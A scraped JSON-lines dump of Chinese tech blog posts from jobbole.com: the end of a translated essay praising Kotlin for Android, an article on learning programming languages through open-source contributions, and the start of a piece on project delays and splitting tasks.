在你打字很快的时候还是有点儿反应不过来。如果你打字总是只打一半儿的话，那么自动补全动能的运行压力还是很大。况且对纯文本的处理也很糟糕，这是所有 IDE 的通病。所以 IDE 和 Emacs 你都是需要用到的。不幸的是，目前 Emcacs 对 Kotlin 的支持现在也就那么回事儿，不过相信以后会越来越好。我现在反正就是在 Emacs 和 IntelliJ 之间来回切换。目前还算是 OK。</p>\n<p>就是这样了。我曾经花了大约 10 年的时间，来找一种语言来取代 Java。我真的找得很努力很辛苦。讽刺的是，在我放弃了以后，这种东西居然出来了。去看看吧。Kudos 对 JetBrains 来说，是一个惊艳的成就。</p>\n<h3>Android：Kotlin 的杀手锏</h3>\n<p>这年头新生编程语言几乎很难产生什么巨大影响力。不是说现在没有新语言产生了，相反是每年都有质量不错的新语言产生，但是然并卵，没人用！要给“不可能”划定界限很难。但是计算机语言的市场已经非常饱和了。如果要让一个新的语言能够大火（而且这个规律在过去 10 到 20 年都成立），那么这个语言就必须有一个“杀手级”的应用。这门语言需要绑定一个平台，让大家都非常迫切地区使用这个平台，这才能促进大家学习这门语言以便在这个平台上编程。</p>\n<p>就目前看来，我们上面所说的杀手级应用——也就是我们上面扯了这么多的东西——却是 Android 恶心的 API。每当你顺着 Android 路线往下走，一遇到 API 就会卡壳，这只会让你去诅咒 Android 这个平台。Android 不论有多少优秀的 API 都不管用，重要的是，Android 糟糕的 API 太多了，所以你不得不停下来去找”现成”的办法（solution）。</p>\n<p>不过兄弟，Android 里面解决问题的“现成办法”可是不少。对于新手来说，有一大堆 Java annotation processors可用，这就为语言的问题埋下伏笔。更不要提一堆迷你的框架（比如 Lyft 的 Scoop）。还有那些和 Android（Java）完全独立的框架：React Native、Cordova、Xamarin、Flutter等等。</p>\n<p>如果以上说的技术你都不喜欢，那么你还可以从语言的角度来解决问题。当然，那些完全独立的框架是基于特定语言的，而并不是Java。</p>\n<p>Kotlin 的竞争优势在于它并不是完全隔离于 Java 语言。它基本上是 100% 可与 Java 相互翻译转换的。这很像C++ 与 C 的关系一样（但它们做不到 100% ）。Kotlin 也是在不断进化的。所以你可以直接把你写的 Kotlin 代码扔到 Android 工程中，连目录都不用改，然后程序就能正常运行了，方便得眼睛都不用眨一下。</p>\n<p>其他种类的 Android 平台都倾向于迫使你去学习一种全新的语言以及对应的平台，其编程范式，理念和特性都各不相同。Kotlin 则是让你直接写出 Android 可运行的类，就跟其他 Android 程序员用 Java 写出来的一样。其实其底层的 API 都是一样的，但是 Kotlin 组织得要好很多。</p>\n<p>还记得我去年夏天把 Android 编程书扔了然后再也不打算看了么。现在 Kotlin 则让我感觉：Android 编程是快乐的？我甚至觉得可能 Android 那些糟糕的 API 很可能并不是那么糟，只是 Java 把它搞得太恶心了而已。</p>\n<p>Kotlin 致力于让大家绕过 Android API 那些恶心的东西，并且能让你充分发挥你的经验，这一点甚至比 iOS 做得还要好。好吧，至少来说比 Objective-C 做得好，因为我觉得 Swift 肯定也不会差。知道为什么吗？因为 Swift 和 Kotlin 很像啊。</p>\n<p><img class=\"alignnone\" src=\"http://wx4.sinaimg.cn/mw690/7cc829d3gy1fftzgxualfj215o0k00sy.jpg\" width=\"600\" height=\"288\"></p>\n<h3>我特别喜欢 Kotlin 的地方有哪些？</h3>\n<p>嗯，这个话题其实要细说就很大了，我觉得我最好再开一篇文章来写这个。这里我就提一下那些高级（high-level）且共性的点。</p>\n<ul>\n<li><span style=\"color: #ff0000;\"><strong>Kotlin 很像 Java</strong></span>。它长得不像 Clojure 或者 Scala 那么奇怪（承认现实把，这两种语言就是挺奇怪的）。所以你学 Kotlin 应该很快。这门语言显然就是写给 Java 开发者来用的。</li>\n<li>它比 Java 更安全。Java 很多需要 annotation processors 来做的事情在 Kotlin 里则是内置的，例如 overriding，nullability等等。而且 Kotlin 对数值转换的规则也更安全，虽然我不太喜欢 Kotlin 的处理方式，但是我还是很感谢这门语言强制我去思考我的数值表现形式。</li>\n<li><strong><span style=\"color: #ff0000;\">Kotlin 和 Java 是可以互译的</span></strong>。真的是指无缝互译。我见过很多 JVM 语言最后挂掉，就是因为其不支持子类继承机制。我不知道什么时候就会用到静态内部类，非静态内部类，或者什么破玩意儿类。Kotlin 在设计时就把和Java互译的属性放在第一位，也就是说，把 Java 翻译到 Kotlin 可以逐渐进行，一次可以直接转换一个文件。</li>\n<li><strong><span style=\"color: #ff0000;\">Kotlin 很简洁</span></strong>。你要知道我也算是个高尔夫球手，所以我实话实说。如果在一切都相同的情况下，我更喜欢短的程序，只要它写的逻辑清楚。Kotlin 对我来说就像是打了一轮好局。平均下来我发现 Kotlin 的代码长度比相同逻辑的 Jython 代码短了 5%-10%（这可是我用某种“黄金标准”测出来的），而且还能保证程序的可读性和类型安全。</li>\n<li><span style=\"color: #ff0000;\"><strong>Kotlin 更贴近实际</strong></span>。Kotlin 支持在一个文件里定义多个类，支持一等方法，操作符重载，扩展方法，类型别名，字符串模板，还有一堆看上去没什么新意的语言特性它都支持。而我就是不明白为什么 Java 什么都不支持，连人们需要的语言特性它都不做。</li>\n<li><span style=\"color: #ff0000;\"><strong>Kotlin 进化很快</strong></span>。例如刚刚宣布启动的对 coroutine 的支持，将会成为提供 asyn/await， geneator 以及所有其他无锁并发特性的基础设施。</li>\n<li><span style=\"color: #ff0000;\"><strong>Kotlin 很擅长“拿来主义”</strong></span>。Kotlin 经常从其他的计算机语言设计中抄点子，并且也毫不避讳。他们说：“我们很喜欢 C# 的处理方式，所以我们就自己照着撸了一个。”</li>\n<li><span style=\"color: #ff0000;\"><strong>Kotlin 支持 DSL</strong></span>。DSL 不到深思熟虑万不得已的话千万不要引入，但是不得不承认 DSL 威力巨大。例如你看 Gradle 的 DSL 和 Maven 比，在典型的 Maven 项目里，配置代码肯定要超过上千行。所以 Kotlin 是来给你降工作压力的。</li>\n<li><strong><span style=\"color: #ff0000;\">Kotlin 的 IDE 是在是太棒了</span></strong>。刚才不久我才在 Emacs 里写程序文件，结果 Emacs 报了一对错。而我把同样的代码拷贝到 IntelliJ 里面，然后按 Alt-Enter 逐一自动修复了 50 多条，然后所有的错误就都搞定了。这真是帮了大忙啊。</li>\n<li>\n<li><strong><span style=\"color: #ff0000;\">Kotlin 很有趣</span></strong>。我跟你们说，Kotlin 就是有趣。也许这是我发自潜意识地在做广告。Kolint 的关键字和方法名都很有意思。Kotlin 把我从一个只会死编程的码农转变为了一个计算机语言的爱好者。</li>\n</ul>\n<p>总之，你就这么想：我收拾东西搬家，然后碰到了邻居 Kotlin。我之前也算见过的一堆计算机语言，但是只有 Kotlin，能够让我在那么短的时间内重写我的游戏服务器代码。而我现在则是在用 Kotlin 重写我之前写过的一切。</p>\n<p>我也知道还有好多其他的程序员也对 Kotlin 感觉非常好，打算成为 Kotlin 程序员。其中大部分的人应该在 1-2 年之内水平就能超过我了。我们私下里谈论过，互相都说“Kotlin 让编程感觉美好的感觉又回来了。”还不错，再我们尚未对编程全部失去兴趣之前，Kotlin 来了。就仿佛你只要把语言的语法学会了。这回把你带回到那种第一次学编程的感觉，无论写什么都觉得自己很牛逼。</p>\n<p>再一次，向 JetBrains 致敬。他们对计算机语言做出了巨大的贡献！我脱帽致敬。</p>\n<p>那么 Kotlin 比你用的任何其他编程语言都好吗？我想对我来说是的。因为，如果你碰巧是在用 Java 的话。如果你一整天就是泡在椅子面前写 Java，那么你会发现 Kotlin 简直就是一股清流。所以也让我知道你们是怎么想的吧。</p>\n<p>免责声明：本文只是阐述我个人对 Android 开发的观点，并不代表我的雇主（谷歌）或者 JetBrains 的观点。</p>\n<p> </p>\n<h3>伯乐在线摘录原文的一些评论：</h3>\n<p><strong>Igor Tovstopyat-Nelip</strong></p>\n<blockquote><p>好文章！</p>\n<p>JetBrains 不在捷克。虽然它是在（捷克）布拉格成立的，但主要在圣彼得堡。他们很多管理层和开发者都是俄罗斯人，很多是从圣彼得堡大学毕业的 。</p>\n<p>关于取名，Java 语言是出自印尼群岛中的 Java 岛。Kotlin 是芬兰湾中的一座岛，离圣彼得堡很近。彼得大帝在 18 世纪早期从瑞典那里抢过了圣彼得堡。此后，一直是俄国波罗的海舰队的海军基地。圣彼得堡有北国风光之美，海军神庙（Naval Temple）令人印象深刻。</p>\n<p>我们公司（位于亚特兰大）也试过多种 JVM 语言，Java 是首选。现在我们更对 Kotlin 感兴趣了。大家都非常喜欢。并且 Kotlin 和 Java 是无缝互通的。</p>\n<p>Kotlin 也能编译成 JS，并且值得一提的是，Kotlin Native 也处于火热发展中，看起来会是 Rust 的强劲对手。</p></blockquote>\n<p>匿名网友：</p>\n<blockquote><p>我过去也一起用过 Eamcs 和 JetBrains 的 IDE（PyCharm 和 Webstorm）。虽然这种组合很怪，但出奇的好。Emacs 适合心灵控制级别的文本编辑，IDE 适合面向鼠标的闲逛和小修改。</p></blockquote>\n<p>Stephen French：</p>\n<blockquote><p>我喜欢 C#，对 Java 落后太多真的失望至极，因为我的工作倾向 JVM。Kotlin 看起来非常有意思！</p></blockquote>\n\r\n        \r\n            <blockquote class=\"rewards\">\n        <p><strong>打赏支持我翻译更多好文章，谢谢！</strong></p>\n        <a href=\"#rewardbox\" id=\"rewards-button\" class=\"fancybox\"><span class=\"btn-bluet-blue href-style\"><i class=\"fa fa-jpy\"></i> 打赏译者</span></a>\n    </blockquote>\n\n    <div id=\"rewardbox\">\n        <h4>打赏支持我翻译更多好文章，谢谢！</h4>\n                <p>\n                        <img src=\"http://www.jobbole.com/wp-content/uploads/2016/04/78805a221a988e79ef3f42d7c5bfd4187.jpeg\">\n            \n                    </p>\n    </div>\n\n    \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"111249\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"111249votetotal\">2</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"111249\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 5 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 6 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/huangxiaofei\">黄小非</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/huangxiaofei\">\r\n\t\t\t<img src=\"http://www.jobbole.com/wp-content/uploads/avatars/5423/Corbis-42-221258652.jpg\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            黄小非：毕业于重庆大学计算机系，南开大学软件工程硕士，SCJP。 目前在一家国企信息中心任职软件开发工程师。主要技术兴趣为Java平台相关技术、系统构架、C/C++、计算机图形学等。（新浪微博：@黄小非）        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/huangxiaofei\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/huangxiaofei/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/huangxiaofei/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 58</a>        </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://wx4.sinaimg.cn/large/7cc829d3gy1ffu5zuwglij20dw099406.jpg"], "fav_nums": 5, "comment_nums": 6, "create_date": "2017/05/22", "praise_nums": 2}
{"tags": "开源, 1 评论 ,开发,程序员,学习", "front_image_path": "full/c5211d7c4148aff2a5ef1731666ac946c02b5e31.jpg", "title": "不按传统套路，我是这样学习新编程语言的", "url_object_id": "118884f5e6dde8887a27b20d5cacc7f8", "url": "http://blog.jobbole.com/111244/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">本文由 <a href=\"http://blog.jobbole.com\">伯乐在线</a> - <a href=\"http://www.jobbole.com/members/paradise_FD\">郑芸</a> 翻译。未经许可，禁止转载！<br>英文出处：<a target=\"_blank\" href=\"https://hackernoon.com/unconventional-way-of-learning-a-new-programming-language-e4d1f600342c#.c1mxajs5w\">Sahil Dua</a>。欢迎加入<a target=\"_blank\" href=\"http://group.jobbole.com/category/feedback/trans-team/\">翻译组</a>。</div><p>【导读】：以往我们认为学习新编程语言的最佳方式是看语法，然后做小项目练习。Sahil Dua 另辟蹊径，找到了学习新语言的另类方式：参与对应的开源项目。参与的过程中，需要查看已有的模块，了解这种语言的模式，对自己写出高质量的代码非常有益。</p>\n<p>补充：Sahil Dua，创业公司 Refiral 合伙人，DuckDuckGo 开源社区 leader 之一，多个开源项目主要贡献者。</p>\n<p><img class=\"alignnone\" src=\"http://wx4.sinaimg.cn/mw690/7cc829d3gy1fft52tryq7j20xc0m8grz.jpg\" width=\"600\" height=\"400\"></p>\n<hr>\n<p>目前编程语言超过 500 多种。学习一门新的编程语言对我们来说已是家常便饭。很有可能你熟悉 C++ 和 Java，而你的工作需要用到 Python 或者你非常精通 Python，但你工作写代码需要用 Java 。再或者你想学习一种炫酷的编程语言来拓展你的技能。</p>\n<p><strong>如果你想学习一门新的编程语言，你选择哪种方法？</strong></p>\n<ol>\n<li>网络教程</li>\n<li>网络公开课（MOOC）</li>\n</ol>\n<p>有些人甚至主张，学习新编程语言最好的方法其实如下：</p>\n<ul>\n<li>学习语法；</li>\n<li>创建一些个人项目；</li>\n</ul>\n<p>嗯，说得过去！你想学习一门编程语言，你学了它的语法，创建一些个人小项目可以确保你应用到这些语法知识。</p>\n<p>在学习不同的编程语言时，我创建了 20 个以上的小项目。相信我，当你为一周甚至一整晚就能快速完成的小项目写代码时，你只是想完成任务。你所关心的只是——“我的代码能运行吗？”你几乎不关心代码的质量。</p>\n<blockquote><p>任何傻瓜都可以编写计算机能理解的代码。优秀的程序员写人类能理解的代码。”  —— Martin Fowler</p></blockquote>\n<p>那么，在尝试学习一门新的编程语言时，你怎样获得好的实践呢？</p>\n<h3>参与该语言的开源项目。</h3>\n<p>是不是感到惊讶？一些人或许会认为 —— ”等等，开源是很难的。只有当我们精通这门语言，我们才能为开源项目做出贡献，对吗？“。答案是否定的。</p>\n<p>让我先给你讲个故事。</p>\n<p>去年，我得到了一个来自 Booking.com 的全职工作 offer，而且我得知我工作的编程语言是 Perl （这是他们公司首要的后端语言）。2016 年 6 月，当我完成我的大学学位，我开始学习 Perl ，以便准备我大学后的第一份工作。我入职的时间是 7 月的第二周，因此我差不多有一个多月的学习时间。</p>\n<p>我开始阅读 Perl 的语法，并开始理解该语言的一些常见模式。到这里，我真正想使用 Perl 来创建一些东西，这样我就可以应用我学到的该语言的知识，实践它的各种概念。当我在为使用 Perl 创建一些东西寻找 idea 时，我在 GitHub 上偶遇了 DuckDuckGo 的开源组织。我注意到一些开源项目是用 Perl 语言写的。我浏览了一下发布的 issues，找到了很多带有“初学者”标签的 Issue 。我立即开始工作，并提交了一些 pull requests。快进到今天，我成为了它们一些开源项目的主要贡献者，以及 DuckDuckGo 20 个开源社区的领导者之一。</p>\n<blockquote><p>这个故事的意思：我通过参与 Perl 语言的开源项目最终学会了 Perl 语言。</p></blockquote>\n<h3>为什么参与到开源就奏效了呢？</h3>\n<p>就在我学习了 Perl 的语法后，我开始参与开源项目。在那期间，我常常查看现有的模块。我时常注意 Perl 正被使用的模式。因此我开始挑选这些好的实例应用到我自己的代码中，这有助于我学习怎样用 Perl 更好地写代码。</p>\n<p>这不只是巧合；让我告诉你另一个故事，以获得更多的相关性。</p>\n<p>最近，在 Booking.com 工作时，我接受了一些任务，其中有一个是在 Go 语言写的服务系统上添加一些功能。下面是我和队友的对话：</p>\n<blockquote><p>我：我真的很喜欢这个任务，我想完成它。你怎么看？他：是的，的确很有意思。但是它要用到 Go，你熟悉 Go 吗？<br>\n我：不。<br>\n他：那你想学吗？<br>\n我 : 是的！<br>\n他：😊 你可以的！</p></blockquote>\n<p>所以，那就是我学习另一种编程语言—— Go 的起点！</p>\n<p>我开始学习 Go 的语法，并在其官网上找到了一个很棒的初学者指南，足以让我掌握这门语言的基本概念。</p>\n<p>再一次地，我开始寻找一些发布的 Issue 中带有“初学者”或者“简易修复”标签的 Go 语言开源项目。我通过 Google 找到了一个项目，大致就是 GitHub 的 REST API 包装器。</p>\n<p>在我开始学习 Go 语言的第二天，我在那个项目上发了第一个 pull request。</p>\n<p><img id=\"pic\" class=\"M_cur_zoom_out aligncenter\" src=\"http://wx3.sinaimg.cn/large/7cc829d3gy1fft2f208b5j214e08qjrn.jpg\"></p>\n<p style=\"text-align: center;\">我去年一整年的贡献图 ( https://github.com/sahildua2305 )</p>\n<h3>开源项目是如何提供帮助的？</h3>\n<p>那么，你现在可能会疑惑参与开源项目怎样可以帮到你获得好的语言实践。有好几个方面，让我们逐个讨论。</p>\n<p><strong>代码质量</strong></p>\n<p>大多数优秀的开源项目都有严格的代码标准，想要你的代码融入其中，你必须遵守这些准则。这会帮助你适应这些准则，因此写出高质量的代码，即使你才刚学习这门语言。</p>\n<p>不仅如此，你还有机会查看代码的其余部分，看看别人是怎么样写代码，写文档的。</p>\n<p><strong>代码审查</strong></p>\n<p>为开源项目做贡献最佳之处就是代码审查（code review）。当 push 你的代码，你得到与该项目相关的专家的反馈，因此它给了你一个提高对这门语言理解的机会。</p>\n<p>你获得了一次如何写处优秀代码的私人机会，并且还免费的呢！</p>\n<p><strong>鼓励和赞赏</strong></p>\n<p><img id=\"pic\" class=\"aligncenter\" src=\"http://wx2.sinaimg.cn/large/7cc829d3gy1fft2f2uu3cj212w088js3.jpg\"></p>\n<p style=\"text-align: center;\">这是我在 Go Lang 上发出的第一个 PR 后，别人写下的<a href=\"https://github.com/google/go-github/pull/497\" target=\"_blank\">第一个评论</a>。</p>\n<p>作为软件开发人员，我们的工作确实需要得到理解和鼓励；开源社区能让你得到足够的鼓励和支持。在我为开源贡献的所有经历中，我从未收到过任何侮辱性或消极的评论。每个人都是特别愿给他人鼓励和帮助。</p>\n<p><img id=\"pic\" class=\"aligncenter\" src=\"http://wx4.sinaimg.cn/large/7cc829d3gy1fft2f2xjlaj212w032t8r.jpg\"></p>\n<p style=\"text-align: center;\">DuckDuckGo 社区其他人给我的评论</p>\n<p>所以，下次你想要学一门新语言，大步向前去冒险吧！找到一个开源项目去做贡献，在学习这门语言和它微妙之处的道路上行进。</p>\n<p> </p>\n<p>【伯乐在线补充】：希望作者这个不走传统惯例的方法，对大家有启发。如果你对如何参与开源还不怎么了解，请看 GitHub 的这篇文章《<a href=\"http://blog.jobbole.com/111204/\" target=\"_top\"><span data-rel=\"title\">新人必看的开源指南：如何参与并做贡献</span></a>》。</p>\n\r\n        \r\n            <blockquote class=\"rewards\">\n        <p><strong>打赏支持我翻译更多好文章，谢谢！</strong></p>\n        <a href=\"#rewardbox\" id=\"rewards-button\" class=\"fancybox\"><span class=\"btn-bluet-blue href-style\"><i class=\"fa fa-jpy\"></i> 打赏译者</span></a>\n    </blockquote>\n\n    <div id=\"rewardbox\">\n        <h4>打赏支持我翻译更多好文章，谢谢！</h4>\n                <p>任选一种支付方式</p>\n                <p>\n                        <img src=\"http://jbcdn2.b0.upaiyun.com/2016/06/dd708b5011ca615a666a617f958683e8.jpg\">\n            \n                            <img src=\"http://jbcdn2.b0.upaiyun.com/2016/06/7bd3dbe2e00ad5c5d39167e2fbbc6464.jpg\">\n                    </p>\n    </div>\n\n    \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"111244\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"111244votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"111244\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 8 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i> 1 评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n<div id=\"author-bio\">\r\n\t\r\n\t<h3 class=\"widget-title\">\r\n\t关于作者：<a target=\"_blank\" href=\"http://www.jobbole.com/members/paradise_FD\">郑芸</a>\r\n\t</h3>\r\n\t<div class=\"alignleft\">\r\n\t\t<a target=\"_blank\" href=\"http://www.jobbole.com/members/paradise_FD\">\r\n\t\t\t<img src=\"http://jbcdn2.b0.upaiyun.com/2017/06/4b984c976f6d01d29b5371c01b42b6a1.jpg\">\r\n\t\t</a>\r\n\t</div>\r\n\r\n    <div class=\"author-bio-info\">\r\n\r\n        <span class=\"author-bio-info-block\">\r\n            Python，数据挖掘        </span>\r\n        <span class=\"author-bio-info-block\">\r\n            <a href=\"http://www.jobbole.com/members/paradise_FD\" target=\"_blank\"><i class=\"fa fa-user\"></i> 个人主页</a> ·\r\n            <a href=\"http://blog.jobbole.com/author/paradise_fd/\" target=\"_blank\"><i class=\"fa fa-file-text-o\"></i> 我的文章</a>\r\n\r\n             · <a title=\"声望值\" target=\"_blank\" href=\"http://www.jobbole.com/members/paradise_FD/reputation/\"><i class=\"fa fa-graduation-cap\"></i> 22</a>        </span>\r\n    </div>\r\n\t<div class=\"clear\"></div>\r\n</div>\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_url": ["http://wx4.sinaimg.cn/mw690/7cc829d3gy1fft52tryq7j20xc0m8grz.jpg"], "fav_nums": 8, "comment_nums": 1, "create_date": "2017/05/21", "praise_nums": 1}
{"tags": "项目管理,管理, 3 评论 ", "front_image_path": "full/eef988d0e379376cb1d67d87543b38db984af7c4.jpg", "title": "什么？项目延期有解药？", "url_object_id": "6096c65b57bff6aa1d128d17d81e7da6", "url": "http://blog.jobbole.com/111137/", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"https://showme.codes/2017-04-14/split-task-by-project-manager/\">翟志军</a>   </div><div>\n<p>最后，项目延期是客观存在的事实，你会选择红药丸，还是蓝药丸？</p>\n<p><img id=\"pic\" class=\"\" src=\"http://wx4.sinaimg.cn/large/63918611gy1ffh4v5154qj20go08o0xn.jpg\"></p>\n<p><em>摘要：当我们要考虑如何让项目不延期时，我们是否做到让每个员工都满负荷了？我们追求的是不延期，还是追求更卓越的产品？</em></p>\n<p>这一两个星期和同事讨论如何使用看板进行项目管理时，总的来说，我遇到最频繁的问题有：</p>\n<ul>\n<li>如何能看出项目是否延期？</li>\n<li>如何拆任务？</li>\n</ul>\n<p>其实，我遇到的问题是：如何能看出项目是否延期？然后经我将问题深挖，才发现他们更本质的问题是：拿到需求，如何拆任务，拆到什么粒度。</p>\n<p>讨论这类问题，最好举个例子，否则整个讨论过程会很虚。</p>\n<p>比如我们的项目经理从产品经理那里拿到一个需求：改版APP。这款APP有12个界面，所有的界面都需要改。而你手下有6个人。</p>\n<p>这时，可以以两种粒度来拆分：</p>\n<ol>\n<li>以界面为粒度</li>\n<li>拆分成更可以量化的粒度。</li>\n</ol>\n<p>关于什么是可以量化的粒度，下文会阐述。</p>\n<h3 id=\"按界面粒度来拆分\">按界面粒度来拆分</h3>\n<p><img id=\"pic\" class=\"\" src=\"http://wx1.sinaimg.cn/large/63918611gy1ffh4v8e246j20yg07ddqi.jpg\"></p>\n<p>可以看出，以界面粒度来拆分，简单粗暴：24人天的任务，我们有6个人，所以，理论上我们只需要4天完成“改版APP”。我们可以很容易看出这个项目是否延期，只要每个界面都没有延期。</p>\n<p>放到看板上，理所当然，每个界面一张卡。</p>\n<p>现实中，我们的项目经理可能还会这样分到人头上：</p>\n<p><img id=\"pic\" class=\"\" src=\"http://wx4.sinaimg.cn/large/63918611gy1ffh4vd4agvj20yg0f9tvu.jpg\"></p>\n<p>为什么一定要分到人头上？除了方便KPI（表面上），背后还有一定的文化因素：因为当项目延期时，我们就可以找出那个相应的人进行<strong>问责</strong>。这种问责的机制导致的后果：人们更愿意推卸责任，而不是共同协作。</p>\n<p>放大一些这个问题，公司内部多个技术部门也会因为这种问责的文化，导致部门之间更趋向责怪对方不按期，而不是共同协作完成一件事情。</p>\n<p>再再放大一些这个问题：<strong>在人们的意识里往往认为，问责后，坏的事情就可以避免问题再发生</strong>。放到我们本篇文章讨论的上下文里，也就是问责可以避免延期。但是，可能吗？因为延期已经发生，我们应该在延期发生前进行协调资源来解决延期。</p>\n<p>我们举个例子：在项目进行的过程中，人员B在做界面3，4时，在第3天时被一个问题卡住了。而人员C其实在第3天时就已经完成了，第4天开始优化。其他人准时完成了自己的任务。最后人员B的延期导致项目延期了2天。这时，如果你问责人员B，那么，这次的延期能倒退吗？也许你会说，问责后，这个人下次就不会延期了。</p>\n<p>我想说：</p>\n<ol>\n<li>延期不延期和你问责没有任何关系。如果有关系，你在项目开始时，就每个人问责一下，这样项目就不会延期了？</li>\n<li>我们应该追求的是每个项目都不延期，而不是下一个项目不延期</li>\n<li><strong>我们追求的是不延期，还是追求更卓越的产品？</strong></li>\n</ol>\n<p>回头看这次延期，也许我们是可以避免的，比如在第3天的站会上，人员C说出自己被某个问题卡住了。这时，可能其他人员一句话就点通人员C的问题了。还有可能是人员C遇到的问题是需要其它部门来协助才能根本解决，这时项目经理就需要与其它部门沟通了。</p>\n<p>回到问题“按界面粒度来拆分任务”这个问题本身。</p>\n<h3 id=\"将界面再拆分成可量化的粒度\">将界面再拆分成可量化的粒度</h3>\n<p><img id=\"pic\" class=\"\" src=\"http://wx2.sinaimg.cn/large/63918611gy1ffh4vivm5mj20yg0hlkgd.jpg\"></p>\n<p>这种方式要我们的项目经理拿到需求后，让最熟悉这个APP的人或团队对需求再进行拆分成一系列工作单元，然后再分别估算这些工作单元在现有的人员基础上需要多少天。最后估算出一个总的交付时间点。我们假设完成这个需求，我们同样需要4天完成。</p>\n<p>至于拆分到什么程度，就是我们上文提到的<strong>可量化</strong>的程度。</p>\n<h4 id=\"什么叫可量化\">什么叫可量化？</h4>\n<p>上面我们看到将需求拆分成一系列工作单元后，我们可以更灵活的安排优先级。同时，这样也帮助我们发现界面1和界面2有一个工作单元3是有交集的。有交集的工作单元，我们应该让同一个人来完成以避免其中的沟通成本。总的来说，拆分成一系列可量化的工作单元后，我们可以：</p>\n<ul>\n<li>更灵活的优先级调控</li>\n<li>发现有交集的工作单元，也就能发现可减少沟通成本的空间。</li>\n</ul>\n<p>但是，<strong>什么样的工作单元叫可量化？</strong></p>\n<p>代码行数是最简单的，估计完成APP改版需要写10万行代码。一个工作单元，我们定1万行？这种工作单元是可以量化，但是写完那么多行代码，你就是完成APP改版这个任务了？</p>\n<p>我们举个例子来说明什么样的工作单元叫可量化，比如对于界面1，我们需要：</p>\n<ol>\n<li>把“完成”按钮的颜色从绿色改成蓝色</li>\n<li>当完成值为100时，不显示100，显示成“恭喜，已完成”</li>\n<li>缓存从服务器获得的任务完成值，对于多次操作，只向服务器请求一次，以提升用户操作的流畅感</li>\n</ol>\n<p>从这个例子，我们可以看出，每个工作单元都应该是：</p>\n<ol>\n<li>准确的：将绿色改成蓝色，而不是红色</li>\n<li>不可分割的：不显示100，显示成“恭喜，已完成”，这个工作单元，你不能再分割了</li>\n<li>体现了业务含义：代码行数并不能体现业务含义，但是提升用户操作的流畅感有业务含义的。</li>\n</ol>\n<h3 